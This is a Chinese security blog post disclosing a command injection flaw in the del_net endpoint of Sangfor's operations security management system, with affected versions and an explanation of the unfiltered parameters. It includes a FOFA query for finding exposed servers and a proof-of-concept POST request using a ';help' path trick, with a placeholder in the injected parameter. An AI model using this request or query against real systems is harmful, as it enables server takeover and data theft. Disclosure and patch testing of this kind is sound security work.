---
title: "深信服运维安全管理系统 del_net 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html
asset_dir: assets/深信服运维安全管理系统-del_net-远程命令执行漏洞
---

# 深信服运维安全管理系统 del\_net 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/3/3 08:35
- 329浏览
- [0评论](#comment)
- 6分钟阅读

深入探索

服务器

软件

SQL

---

# 漏洞简介

深信服运维安全管理系统 del\_net 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

安全工具开发

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#delNet`的实现逻辑

[![深信服运维安全管理系统 del_net 远程命令执行漏洞](images/img-001-39374e4d6148.webp)](https://image.mrxn.net/3d8e6bacecc7408badd3e2ed5d96381b.webp)

两个参数**ethnum**与**IPV**被直接拼接在**cmd**中，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞（两个参数均存在命令执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)）。

深入探索

安全认证考试

云安全解决方案

安全运维咨询

# 漏洞复现

[![深信服运维安全管理系统 del_net 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以ethnum为例
>
> 漏洞预警服务

```
POST /fort/system;help/netConfig/del_net HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

ethnum=RCE_POC&IPV=255.255.255.1
```

深入探索

授权

编程语言教程

Nessus

访问命令执行结果文件

[![深信服运维安全管理系统 del_net 远程命令执行漏洞](images/img-003-fd39548d0172.webp)](https://image.mrxn.net/56faf74fc4fc4e2e96b66fd712c2b661.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALkklEQVR4AezbgXLbug4E0Jz7///8XiBkKYqSnTS3bTxz5TG8wGIB0YRod5L0n7e3t/991/738Uj9R7jByq3xJvp4SS74QR/gUS78FR4avAez5j3cnjNX/kZ+vFRc9hGeoHKxJBN/F2sg77X381V2YAzkfcJvX7VHi8cbbY80z/hc/0qz5jhf5yua9OZcn9yKHLV0nOsVrjXFfdXm2jGQmbz9n9uB00Do6XPGR8vMnTDnr7jKs/etuGzVsmtov3RldJyaGStfFq78R/ZIQ/fH6RPjUa9nPHs/jv5V3WkgV6Kb+3s78FsGQk9+XjZHLnfkjLO+fLpm1sTnmCt9Gc2jwi8btu+79A9+ucG7kO6B9+j3PH/LQH7PUu4utQN/bCCP7jhsdyY71kLKUkPnioutOc4amqMxtc+Q1tKY6xTSHEd81u/f5v7YQP7twv6r9X9mIP/V3fwN7/s0kDqqj+yz68119DFfa2ZNfI7alafzGO2iucKIksP2MZn4ClNDaxFq4FVduCFanOSvcJFu4WkgG3u//NgOjIFgu4v4HL+zWrrvXEtzuXvoeNbEjyZxkK5BqC8htve7inOdwuTKL+NYQ8eIdCC2/nyOo+jdGQN59+/nC+zAPzX571rWn3r2uyG5YDSJr/CZhu691qWmcM1xXVO60peVX1Z+WfmPrPJlyZcfu+KS+xW8T0h28kXw4UB4fHdxnbu6Ezhq6RhjC7B93g7iwknvpOgazhjNipy1POZyTVqTfhzj8DPSGs4YHefcw4Gk6Ma/uwOngdBTyzLoGKHGj6Xx8M7mOpe7bsY0pmtonDUcudTMOOs/81O36sIX0tcsf7bUzBxHbTRXyFE79zkNZE6+mP+fWM49kBcb8z/08aEx67s6aslx1IafMfXh6Bp2TO4RctbSXPrPSOf4HNdr0jVzv9WnNamlY4QaiNPHOUcu/UfRu3OfkPdNeKXnGEimFbxaJD3haII0z46pjyYYvpDWl39lqbnC6OkeCPUlTE9sd3LiZ8XRcKwpPnV0bo0RavyjKETVx8ZAkrzxZ3dgDATbnZLl0DE7ZorsHFJyQFz2S4/CFJR/ZckX0v1oLK5srqt4tjm3+rOufLovj7F0ZelVfuyKS+4R0tea82MgM3n7P7cDYyDrhNd4XuKaW+NZS98FX9Gkjq5hx+Se9Vk1dH14OmbH9AtGWxguSNdVbjU6F21w1VXMUUvHeBsDebsfL7ED90BeYgz7IsbvQ3bqc48+Ys+U65HlcU20tCbxs/609kpD59Y+iQuv6h5xXPe70tPa5OpasXBBWpt84X1CsjsvgmMg9LQ4Yk0tRucSB/NeEheuXOIr5Nj3SrNydY0yuhZDUnwZtn96c8bKl6WI1iQupLnSldExjaWJVb4s8RVW/srofri/1N9e7DFOyLquTJJ9eiu31rBrOfrRsvPhVqQ1ud6M0XLWPMvNPcqPNljcaslxvFb4K0wPumbWcObmfPkPB1LJ2/7+DpwGkglnKYkLV47jxEsTW7VrHN2M0QTp/pzxSpNeyX0FOfaea/5Nv/Rh73/FcfyPQaeBpOjGn9mBbw2EnnqWzDEuPncXnUtcuRid44jRzpiacImvcNVw7I9RtmpH4t3B9q+0Z5p32eEZbXBOhgsmR18H97+y3v7M49tdv3VCvn21u/DTHRi/U4+SPj6JZ6RzOXLBWbP60dC17BhtNEF2De1HyzEOPyNHTfrOGD2tTY6OEclAbB9hg5gcOscR07dwkm9ucWVb8PFyn5CPjXgVGAOpSZWtC2OfeHLsHEIfENvdRGP1Xu1Q8B5w1L5Tv/Sk6x8V0Xl2zJpobq59lisdXYMKLw2HfcDQYcsN4t0ZA3n37+cL7MAYCD2tZ3dFcitevY9VQ/e/0nLMcYyrJv3KL0t8hZUv49yn+NloTfo8y0UTnLXhVrzSzNzqj4GsiTv+mR34Y7+gytvheAfSMSI5Ye6yU+KCwPY5jFM2fbBpToKJ4O9pctmsL3HhfUJqF17I7oG80DBqKWMgOT7sR7cEVxbtVe4RR/dN7YxrDa2dec5c5X+lz6yNXz3K1ri479izPhzfA8e4rjcGUsFtP78D40cn9LQy4eC8RFrDEaPhyCOpgdi+YDG4OOs1ExdGE8Tow9GPZkV2XXLVu4zOhS8svoxzrvKz0RqOOGuqV9nMlV9c7D4htSMvZGMgmdC6tvCFyZX/XUuPQvpuSq/iZqPzGHS0wZGYnOSCU2q4OJywaGekNeFG8YcTvvCD+hJw7EvHuH8f8vZij3FC1nXRU5v5uhPK6ByPca4rn9aWvxqdozH5ulYs3IrJFybHsU/40jyyaOhahBqY2kFcONEEZwm2U7nmEhc+HMjc6Pb/3g6MgdDTozFLoGOEGv8lqyY62xB80Ult5ImD4b+Kax0OdyQdY7TEpqFxJC4cjho6xlBj6xcia5oxOY7a4sdAKrjt53fgBwby82/6lVcwBpIjtS42fGFynI9a5UoTozU0Vv6RpWbN07Xsf0wWDZ1LfIWP+paW6/rUFJaujGtt5WKlL0tM17BjcsHSl7FrxkAiuvFnd2D8PoSeUk1stnl5HDVzbvXnHo98ul9qOcZz3apJjq5BJAOxfcHSmJrCiMovSzxj8VcWzZy74uZ8+dEEOa/rPiHZnRfBMZCaYFnWRU+PHR/lrvhwX0H6GnX9Mjr+Su0zTfUqi4buy/k76UoTbkX2PrQfDdcxIjkhxkkeAzmpbuJHduA0EHpadWeVXa2q+LI1V1yM7sMR55pow9HaNaZ5JPUU0xfbnRdx+EI6R2Nxq9E5Gtc+iX8nngbyO5vfvX59B+6B/Pqe/dGKMRCOx5KO52OcldC5xFc4183+rKX7JD/nyg9fWHFZ+WXll5VfVkb3o7G42WgeVXowbB9v7DjXlp8CWlNcjOaiCSZfyFFT3GpjIGlw48/uwKcDoaeKsdJ1qjjdXRHTucRXyFGT/jSPUYbTtWgudUGap3E0+aJD19G4ltE81tRlnHUlidN7+XQgKb7x7+zAGEimt+K8jOToyc658pMvpDXll1W+jOZR4WaVL9uC6aW42ERv7iN+S37jJf2eIbY7Ou2vtMnRWnZcc6kPXzgGUsFtP78DYyDsk2T3r5Z4NdlV9xXNoxr269N++gVTm7iQ1tJYXFm0V1j5sqvcZxx9HXasXmWpLT9G6x7FxY+BpMGNP7sD4y8XazqzPVsWPeloUkfzSGr7zGWPoy0cog8Hm/4jvARawxnXAlpT13pktIbPMf3TK/GMdJ9wdIxQT/E+IU+35+8n74E83fO/nxy/MVwvnWM5YzThEmP7qAlfmFz5ZbQm/DMs/Woc69f8HKd3uMR0D4QauGpH4t15lntPb89oVtySHy/JfYTjz6mw7R/uPyV9e7HH+FJnnxJf8/NeMnn2uuRW5KyhuWg5xsXnGuXPRmsx05uP7c7bguWFzqUvHS+yQxjtgVwCPu/DUZO+hfd3yLKhPx2OgdR0vmqPFj3XR0PfDcmFL7ziiv8VS4/CR3Uc1zBr6VxqKxcLF+SoDT/jo9orDd2PHcdA5oLb/7kdOA2EfVoc/V9ZJl2bO4aO5x40F00wGjqPUAOxfT9wxojSLxj+Cn9FQ19z7kNzHPFKEy7XnPE0kIhv/JkduAfyM/v+8Kq/ZSAcjynGBbF9tMzHMv4QPXCiK+S6z1xautnm3CM/+kf5P8HT7+Wq928ZyFXjm/veDvyWgVzdZStH3xXsmCWzcwi9nSxsuPYbosmhtaHomMbwz5DWsv+5KTuHZ+XjxyHPROt7wfYecf/o5O3FHqcTkuld4a+snZ762mfukdzMfdWn+39VXzq6hsd3f9ZUWDVl5c9W3GrJP+KTL3ymOQ1kFd/x392BMRD2u4fn/qMl1vRXi5bumbiQI5faypUlLqx4tuLKZu5P+1yvt9ZB52jMWugYoQZi++4YxLszBvLu388X2IF7IC8whHkJ/wcAAP//2iZ6HAAAAAZJREFUAwCFpnunNWmawwAAAABJRU5ErkJggg==)

手机扫码阅读
